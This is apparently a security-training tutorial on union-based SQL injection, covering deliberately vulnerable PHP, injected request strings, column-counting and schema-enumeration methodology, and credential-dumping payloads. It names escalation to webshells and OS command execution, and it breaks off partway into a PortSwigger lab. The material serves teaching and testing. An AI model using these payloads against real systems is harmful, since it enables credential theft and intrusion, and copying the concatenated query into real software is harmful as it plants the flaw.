Imagine a corporate assistant who compiles a printed report every quarter. The boss asks for the Q3 sales figures, and the assistant queries the database, prints the results, staples the pages, and delivers the report. Now imagine an attacker slips an extra page into the stack before it reaches the boss -- a page listing every employee's salary, pulled from the payroll database. The boss reads through the entire report without realizing the extra page came from a completely different source. The report format is the same, the paper is the same, and nothing about the delivery mechanism flagged the addition.

\`UNION SELECT\` works exactly the same way. The application runs its normal query and gets the Q3 sales rows. The attacker's injected \`UNION SELECT username, password FROM users\` adds rows from the users table. The database engine merges both result sets into one. The application renders all the rows through its standard template, never distinguishing between legitimate data and injected data. The attacker reads the extra rows directly from the page.

### Vulnerable Code

\`\`\`php
// PHP: user input concatenated directly into query
$category = $_GET['category'];
$query = "SELECT name, description FROM products WHERE category = '" . $category . "'";
$result = mysqli_query($conn, $query);
while ($row = mysqli_fetch_assoc($result)) {
    echo "<tr><td>" . $row['name'] . "</td><td>" . $row['description'] . "</td></tr>";
}
\`\`\`

### What the Attacker Submits

\`\`\`
GET /products?category=' UNION SELECT username, password FROM users--
\`\`\`

### What the Database Executes

\`\`\`sql
SELECT name, description FROM products WHERE category = '' UNION SELECT username, password FROM users--'
\`\`\`

The original query returns zero products (empty category). The UNION SELECT returns every row from the \`users\` table. The application iterates over the combined result set and renders \`username\` in the "name" column and \`password\` in the "description" column. The attacker reads the credentials directly from the HTML table.

### Why It Works

The SQL \`UNION\` operator is a legitimate language feature designed to combine results from multiple SELECT statements. The database engine does not distinguish between a UNION written by a developer and one injected by an attacker -- it simply merges the result sets. As long as the column count matches and the data types are compatible, the UNION executes without error. The application code, which expects a result set of name/description pairs, receives a result set of username/password pairs and renders them identically.

### Column Count Matching Requirement

The UNION operator requires that both SELECT statements produce the same number of columns. If the original query selects 3 columns and the attacker injects \`UNION SELECT 1,2\`, the database returns an error. The attacker must first determine the column count, then pad their injection with the correct number of values.

### Concrete Impacts

| Impact | How Union-Based SQLi Achieves It |
|--------|----------------------------------|
| **Full database extraction** | UNION SELECT pulls credentials, PII, financial records, tokens -- entire tables per request with GROUP_CONCAT |
| **Schema discovery** | Querying information_schema/all_tables/sqlite_master reveals all tables, columns, data types |
| **Authentication bypass** | Extract admin password hashes, API keys, or session tokens; or inject fabricated credential rows |
| **Remote code execution** | MySQL: UNION SELECT INTO OUTFILE writes webshells; MSSQL: chain to xp_cmdshell; PostgreSQL: COPY TO PROGRAM |
| **File system read** | MySQL LOAD_FILE(), PostgreSQL pg_read_file(), Oracle HTTPURITYPE/UTL_FILE read server files |
| **Privilege escalation** | Extract DB admin credentials, encryption keys, or tokens stored in the database |

## Attack Surface Identification

### Where to Look

Union-based SQLi requires that query results are reflected in the response. Target any parameter whose value flows into a SELECT query that renders data on the page.

| Injection Point | Example | Priority |
|-----------------|---------|----------|
| **GET query parameters** | \`/products?category=electronics&sort=name\` | Highest -- most common, easiest to test |
| **URL path segments** | \`/api/v1/users/123\` | High -- numeric IDs often unsanitized |
| **POST body fields** | \`{"search": "term", "filter": "active"}\` | High -- especially JSON APIs |
| **Cookie values** | \`Cookie: user_id=5; session_prefs=default\` | Medium -- less common but overlooked |
| **HTTP headers** | \`X-Forwarded-For\`, \`Referer\`, \`User-Agent\` | Medium -- logged to DB and queried back |
| **REST API filters** | \`/api/products?filter[category]=1&sort=price\` | High -- ORM filter passthrough |
| **GraphQL variables** | \`{"variables": {"userId": "5"}}\` | Medium -- resolvers may use raw SQL |
| **Hidden form fields** | \`<input type="hidden" name="product_id" value="42">\` | Medium |
| **Multi-select parameters** | \`?tags=1,2,3\` used in \`WHERE id IN (...)\` | High -- comma-delimited injection |

### Indicators the Application Is Vulnerable to UNION

1. **Data tables or lists rendered from query results** -- product listings, search results, user directories, report tables
2. **Numeric or string parameters that modify the displayed data** -- category filters, sort columns, search terms
3. **Error messages mentioning SQL syntax** -- confirms injection point exists; test UNION next
4. **Column count can be determined** -- ORDER BY N succeeds up to a point, then errors
5. **NULL injection changes response** -- \`' UNION SELECT NULL,NULL--\` produces a different response than a syntax error

### What Disqualifies UNION-Based (Use Another Technique Instead)

- Application returns no visible data from the query (blind techniques needed)
- Application displays only a boolean result (boolean-blind)
- Application returns consistent response regardless of query results (time-based blind)
- WAF aggressively blocks UNION keyword after all bypass attempts exhausted (stacked queries, error-based, or OOB)

## How It Works

\`\`\`mermaid
flowchart TD
    A["<b>Phase 1: Detect</b><br/>Inject ' or \\" to confirm SQLi point"] --> B["<b>Phase 2: Count Columns</b><br/>ORDER BY N / UNION SELECT NULL,..."]
    B --> C["<b>Phase 3: Find Text Columns</b><br/>Replace NULL with 'marker' per position"]
    C --> D["<b>Phase 4: Fingerprint DB</b><br/>@@version / version() / BANNER"]
    D --> E["<b>Phase 5: Enumerate Schema</b><br/>information_schema / all_tables / sqlite_master"]
    E --> F["<b>Phase 6: Extract Data</b><br/>UNION SELECT col1,col2 FROM target"]
    F --> G["<b>Phase 7: Escalate</b><br/>File read/write, RCE chains, DIOS"]

    style A fill:#ef5350,color:#fff
    style B fill:#ff7043,color:#fff
    style C fill:#ffa726,color:#fff
    style D fill:#66bb6a,color:#fff
    style E fill:#42a5f5,color:#fff
    style F fill:#7e57c2,color:#fff
    style G fill:#d32f2f,color:#fff
\`\`\`

**Phase 1 -- Detect Injection Point.** Inject standard SQL metacharacters (\`'\`, \`"\`, \`;\`, \`--\`, \`#\`) into each parameter. Observe whether the response changes: an error message, different content, or altered behavior confirms that user input reaches a SQL query without sanitization.

**Phase 2 -- Count Columns.** Two methods: (a) \`ORDER BY N\` -- increment N from 1 until the database errors with "column N out of range"; the last successful N is the column count. (b) \`UNION SELECT NULL,...\` -- add NULLs until the query succeeds; the number of NULLs that works is the column count. ORDER BY is faster (binary search possible), while UNION SELECT NULL gives immediate confirmation.

**Phase 3 -- Find Text Columns.** Replace each NULL with a string literal (\`'a'\`) one position at a time. If the page renders the string, that column is injectable and visible. If a type conversion error appears, that column is numeric. Identify all text-compatible positions.

**Phase 4 -- Fingerprint the Database.** Inject version-detection queries through a confirmed text column: \`@@version\` (MySQL/MSSQL), \`version()\` (PostgreSQL), \`BANNER FROM v$version\` (Oracle), \`sqlite_version()\` (SQLite). The version determines which system catalog tables and aggregation functions to use.

**Phase 5 -- Enumerate Schema.** Query the system catalog to discover databases, tables, and columns. MySQL/PostgreSQL/MSSQL use \`information_schema\`. Oracle uses \`all_tables\` and \`all_tab_columns\`. SQLite uses \`sqlite_master\`. Use aggregation (GROUP_CONCAT, STRING_AGG, LISTAGG) to pull all names in a single request.

**Phase 6 -- Extract Data.** Craft the final UNION SELECT targeting the discovered table and columns. Use aggregation to dump multiple rows in one request. Use LIMIT/OFFSET or ROWNUM for pagination when aggregation output is truncated.

**Phase 7 -- Escalate.** Depending on database privileges: read files from the server filesystem, write webshells via INTO OUTFILE or COPY TO, execute OS commands via xp_cmdshell or COPY TO PROGRAM, or use DIOS to dump the entire schema in one shot.

## Detection and Validation

### Quick Confirmation Test

\`\`\`
# Step 1: Confirm injection with a single quote
/products?category=test'

# Step 2: Fix the query to confirm control
/products?category=test' AND '1'='1

# Step 3: Try ORDER BY to count columns
/products?category=test' ORDER BY 1--
/products?category=test' ORDER BY 5--
/products?category=test' ORDER BY 3--

# Step 4: Confirm UNION works
/products?category=test' UNION SELECT NULL,NULL,NULL--

# Step 5: Identify text column
/products?category=test' UNION SELECT 'INJECTED',NULL,NULL--
\`\`\`

### Observable Indicators

| Signal | Meaning |
|--------|---------|
| Page renders "INJECTED" string | Column 1 is a visible text column -- UNION confirmed |
| Page shows extra rows in a data table | UNION rows merged into output |
| Response length changes significantly with NULL count | Column count matched; application processing UNION results |
| Error: "number of expressions must match" | Column count wrong; adjust NULL count |
| Error: "Conversion failed ... varchar to int" | Column is numeric; use NULL in that position, string elsewhere |
| Content disappears entirely | UNION may have succeeded but application only shows first row; use impossible WHERE on original query |

### Force Original Query to Return Nothing

Suppress the application's real data so only injected rows appear:

\`\`\`sql
-- Numeric parameter: use impossible value
-1 UNION SELECT username,password,NULL FROM users--
99999 UNION SELECT username,password,NULL FROM users--

-- String parameter: use impossible condition
' AND 1=2 UNION SELECT username,password,NULL FROM users--
\`\`\`

### PortSwigger Lab: SQL injection UNION attack, determining the number of columns returned by the query

**Difficulty:** PRACTITIONER

**Objective:** Determine the number of columns returned by the query and perform a UNION attack that returns an additional row containing null values.

Navigate to the lab application. Click on a product category (e.g., "Gifts"). Observe the URL:

/filter?category=Gifts'+ORDER+BY+2--     (page loads normally)
